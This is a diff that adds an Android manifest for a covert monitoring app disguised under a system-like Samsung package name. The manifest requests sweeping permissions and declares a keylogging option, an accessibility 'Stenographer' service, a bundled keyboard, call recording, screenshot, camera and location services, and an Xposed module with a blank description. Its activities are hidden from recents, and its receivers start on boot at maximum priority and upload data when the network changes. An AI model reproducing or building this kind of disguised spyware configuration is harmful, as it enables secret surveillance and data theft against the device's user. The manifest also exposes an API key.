@@ -1,0 +1,301 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="28" android:compileSdkVersionCodename="9" package="com.sec.android.internet.im.service.im20190419" platformBuildVersionCode="28" platformBuildVersionName="9">
+    <uses-feature android:name="android.hardware.camera"/>
+    <uses-feature android:name="android.hardware.camera.autofocus"/>
+    <uses-feature android:name="android.hardware.camera.any"/>
+    <uses-feature android:glEsVersion="0x00020000" android:required="true"/>
+    <uses-permission android:name="android.permission.REBOOT"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <uses-permission android:name="android.permission.WRITE_LOGS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.READ_USER_DICTIONARY"/>
+    <uses-permission android:name="android.permission.WRITE_USER_DICTIONARY"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.INTERACT_ACROSS_USERS_FULL"/>
+    <uses-permission android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+    <uses-permission android:name="android.app.action.BIND_DEVICE_ADMIN"/>
+    <uses-permission android:name="android.permission.READ_CALENDAR"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
+    <uses-permission android:name="android.permission.READ_PROFILE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.android.launcher.permission.READ_SETTINGS"/>
+    <uses-permission android:name="com.android.launcher.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <application android:allowBackup="false" android:appComponentFactory="android.support.v4.app.CoreComponentFactory" android:hardwareAccelerated="false" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:name="com.as.monitoringapp.logging.MyApplication" android:sharedUserId="android.uid.system" android:supportsRtl="true" android:theme="@style/Theme1">
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.Get10ClpInfoReceiver">
+            <intent-filter>
+                <action android:name="B.k.BackClipAc"/>
+            </intent-filter>
+        </receiver>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.ClientShowLogs" android:screenOrientation="nosensor" android:theme="@style/Theme1"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.logging.FloatActivity" android:theme="@style/Theme.Transparent"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.SplashScreen" android:screenOrientation="nosensor" android:theme="@style/Theme1nt">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.Home" android:screenOrientation="nosensor" android:theme="@style/Theme1nt" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.Logging" android:screenOrientation="nosensor" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.EmailSettings" android:screenOrientation="nosensor" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.ImagePagerActivity" android:screenOrientation="nosensor" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.InstallXposedActivity" android:screenOrientation="nosensor" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.KeyloggingOption" android:screenOrientation="nosensor" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.timelimit.SettingGuide" android:screenOrientation="nosensor" android:theme="@style/Theme1"/>
+        <activity android:configChanges="locale|orientation|screenSize" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.timelimit.Prefs_DailytimeActivity" android:theme="@style/AppTheme_new"/>
+        <activity android:configChanges="locale|orientation|screenSize" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.timelimit.Prefs_BedTimeActivity" android:theme="@style/AppTheme_new"/>
+        <activity android:configChanges="locale|orientation|screenSize" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.timelimit.Prefs_AppBlockerActivity" android:theme="@style/AppTheme_new"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_Settings_State_Activity" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_User_Sys_App_Activity" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_BgGroundApp_Protect" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_Security_SysAdmin_Activity" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_UsageAccess_Accessibility" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_UisettingsActivity" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_Complete_Activity" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_Camera" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_Agreement_WebActivity" android:theme="@style/Theme"/>
+        <activity android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.Wizard.Wizard_Agreement_Web5Activity" android:theme="@style/Theme"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.timelimit.Prefs_HomeWorkActivity" android:theme="@style/AppTheme_new"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.timelimit.WarningBlockedActivity" android:screenOrientation="nosensor" android:theme="@android:style/Theme.Light.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:name="com.as.monitoringapp.TransAppActivity" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.AppSecurityActivity" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.ChangePin" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.LanguageActivity" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.ChangePassword" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.LoginPage" android:screenOrientation="nosensor" android:theme="@style/Theme1nt"/>
+        <activity android:configChanges="keyboardHidden|locale" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.TrialPage" android:noHistory="true" android:theme="@style/Theme1nt">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="smartkey"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.ResetPassword" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.ImageGridActivity" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:icon="@drawable/ic_launcher" android:label="@string/english_ime_settings" android:name="com.android.inputmethod.latin.settings.SettingsActivity" android:theme="@style/platformSettingsTheme" android:uiOptions="splitActionBarWhenNarrow">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity>
+        <activity android:icon="@drawable/ic_launcher" android:label="@string/android_spell_checker_settings" android:name="com.android.inputmethod.latin.spellcheck.SpellCheckerSettingsActivity" android:theme="@style/platformSettingsTheme">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity>
+        <activity android:icon="@drawable/ic_launcher" android:label="@string/dictionary_settings_title" android:name="com.android.inputmethod.dictionarypack.DictionarySettingsActivity" android:theme="@style/platformSettingsTheme" android:uiOptions="splitActionBarWhenNarrow">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/ic_launcher" android:label="@string/dictionary_install_over_metered_network_prompt" android:name="com.android.inputmethod.dictionarypack.DownloadOverMeteredDialog" android:theme="@style/platformActivityTheme">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|locale|orientation|screenSize" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.SettingsActivityNew" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <activity android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.root.PermissionsActivity" android:screenOrientation="nosensor" android:theme="@style/AppTheme_Wizard"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="@string/app_lable" android:launchMode="singleInstance" android:name="com.as.monitoringapp.DebugActivity" android:screenOrientation="nosensor" android:theme="@style/Theme"/>
+        <meta-data android:name="xposedmodule" android:value="true"/>
+        <meta-data android:name="xposeddescription" android:value="　　　"/>
+        <meta-data android:name="xposedminversion" android:value="30"/>
+        <meta-data android:name="io.fabric.ApiKey" android:value="c10be15ac8d0fe11948e7f8198875291fb16c44b"/>
+        <provider android:authorities="com.sec.android.internet.im.service.im20190419.databaseAccess" android:enabled="true" android:exported="true" android:name="com.as.iklmodule.util.MyContentProvider"/>
+        <provider android:authorities="com.sec.android.internet.im.service.im20190419.appsettings" android:enabled="true" android:exported="true" android:name="com.as.iklmodule.util.AppsettinsContentProvider"/>
+        <provider android:authorities="com.sec.android.internet.im.service.im20190419.ScrDataBase" android:enabled="true" android:exported="true" android:name="com.as.iklmodule.util.ScrContentProvider"/>
+        <provider android:authorities="@string/authority" android:exported="false" android:grantUriPermissions="true" android:icon="@drawable/ic_launcher" android:label="@string/dictionary_provider_name" android:multiprocess="false" android:name="com.android.inputmethod.dictionarypack.DictionaryProvider"/>
+        <provider android:authorities="com.sec.android.internet.im.service.im20190419.fileProvider" android:exported="false" android:grantUriPermissions="true" android:name="android.support.v4.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
+        </provider>
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.BkgroundWork">
+            <intent-filter>
+                <action android:name="B.k_BackgWork"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:name="com.as.monitoringapp.logging.StartupReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.OutgoingCallObserver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.UploadByNetWork">
+            <intent-filter android:priority="2147483646">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.ScreenShotsReceiver">
+            <intent-filter android:priority="2147483605">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.LicenseReceiver">
+            <intent-filter android:priority="2147483645">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.RestartReceiver">
+            <intent-filter android:priority="2147483644">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.GpsHandler">
+            <intent-filter android:priority="2147483643">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.as.monitoringapp.logging.MyReceiver"/>
+        <receiver android:label="NetworkChangeReceiver" android:name="com.as.monitoringapp.logging.NetworkChangeReceiver">
+            <intent-filter android:priority="2147483642">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:description="@string/app_name" android:name="com.as.monitoringapp.AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/lock_screen"/>
+        </receiver>
+        <receiver android:exported="false" android:icon="@drawable/ic_launcher" android:name="com.android.inputmethod.latin.DictionaryPackInstallBroadcastReceiver">
+            <intent-filter>
+                <action android:name="com.sec.android.internet.im.service.im20190419.UNKNOWN_CLIENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:icon="@drawable/ic_launcher" android:name="com.android.inputmethod.dictionarypack.EventHandler">
+            <intent-filter>
+                <action android:name="android.intent.action.DOWNLOAD_COMPLETE"/>
+                <action android:name="android.intent.action.DATE_CHANGED"/>
+                <action android:name="com.sec.android.internet.im.service.im20190419.UPDATE_NOW"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:name="com.as.monitoringapp.logging.BackService">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </service>
+        <service android:name="com.as.monitoringapp.timelimit.AppLimitService"/>
+        <service android:enabled="true" android:name="com.as.monitoringapp.logging.iKClipboardService">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </service>
+        <service android:enabled="true" android:name="com.as.monitoringapp.logging.CallingRecordService">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </service>
+        <service android:accessibilityFlags="flagReportViewIds" android:enabled="true" android:label="@string/app_name" android:name="com.sec.android.internet.im.service.im20190419.Stenographer_Service" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/stenographer_config"/>
+        </service>
+        <service android:icon="@drawable/ic_launcher" android:label="@string/english_ime_name" android:name="com.android.inputmethod.latin.LatinIME" android:permission="android.permission.BIND_INPUT_METHOD">
+            <intent-filter>
+                <action android:name="android.view.InputMethod"/>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <meta-data android:name="android.view.im" android:resource="@xml/method"/>
+        </service>
+        <service android:icon="@drawable/ic_launcher" android:label="@string/spell_checker_service_name" android:name="com.android.inputmethod.latin.spellcheck.AndroidSpellCheckerService" android:permission="android.permission.BIND_TEXT_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.textservice.SpellCheckerService"/>
+            </intent-filter>
+            <meta-data android:name="android.view.textservice.scs" android:resource="@xml/spellchecker"/>
+        </service>
+        <service android:icon="@drawable/ic_launcher" android:label="@string/dictionary_service_name" android:name="com.android.inputmethod.dictionarypack.DictionaryService"/>
+        <service android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.logging.LocationUpdatesService"/>
+        <service android:name="com.as.monitoringapp.Camera.Camera2ServiceFront"/>
+        <service android:name="com.as.monitoringapp.Camera.Camera2ServiceBack"/>
+        <service android:name="com.as.monitoringapp.logging.CaptureService"/>
+        <service android:label="@string/app_name" android:name="com.as.monitoringapp.logging.MyNotificationListenService" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        <service android:enabled="true" android:exported="true" android:name="com.as.monitoringapp.Camera.FloatingVideoService"/>
+        <uses-library android:name="org.apache.http.legacy" android:required="false"/>
+        <service android:exported="false" android:name="com.google.firebase.components.ComponentDiscoveryService">
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.iid.Registrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+        </service>
+        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdService">
+            <intent-filter android:priority="-500">
+                <action android:name="com.google.firebase.INSTANCE_ID_EVENT"/>
+            </intent-filter>
+        </service>
+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <provider android:authorities="com.sec.android.internet.im.service.im20190419.firebaseinitprovider" android:exported="false" android:initOrder="100" android:name="com.google.firebase.provider.FirebaseInitProvider"/>
+        <receiver android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementReceiver"/>
+        <receiver android:enabled="true" android:exported="true" android:name="com.google.android.gms.measurement.AppMeasurementInstallReferrerReceiver" android:permission="android.permission.INSTALL_PACKAGES">
+            <intent-filter>
+                <action android:name="com.android.vending.INSTALL_REFERRER"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementService"/>
+        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+        <provider android:authorities="com.sec.android.internet.im.service.im20190419.crashlyticsinitprovider" android:exported="false" android:initOrder="90" android:name="com.crashlytics.android.CrashlyticsInitProvider"/>
+    </application>
+</manifest>
